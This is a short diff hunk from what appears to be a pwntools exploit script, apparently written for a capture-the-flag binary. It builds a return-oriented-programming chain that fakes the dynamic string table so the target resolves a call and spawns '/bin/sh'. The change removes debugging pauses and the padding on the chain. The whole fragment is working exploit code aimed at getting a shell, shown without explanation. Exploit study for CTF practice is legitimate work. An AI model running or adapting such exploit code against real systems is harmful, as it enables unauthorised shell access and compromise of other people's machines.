@@ -45,15 +45,10 @@ def pwn():
 	rop.raw(0xdeadbeef) # anywere is ok, we got shell before returning to there.
 	rop.raw(binsh_addr) # where the "/bin/sh\0" locates.
 
-	getpid()
-	g_io.send(rop.chain().ljust(0x100))
-	pause()
+	g_io.send(rop.chain())
 	g_io.send(flat(fake_dynstr_addr))
-	pause()
 	g_io.send(fake_dynstr)
-	pause()
 	g_io.send(flat(len(fake_dynstr)))
-	pause()
 	g_io.send("/bin/sh\0")
 
 	
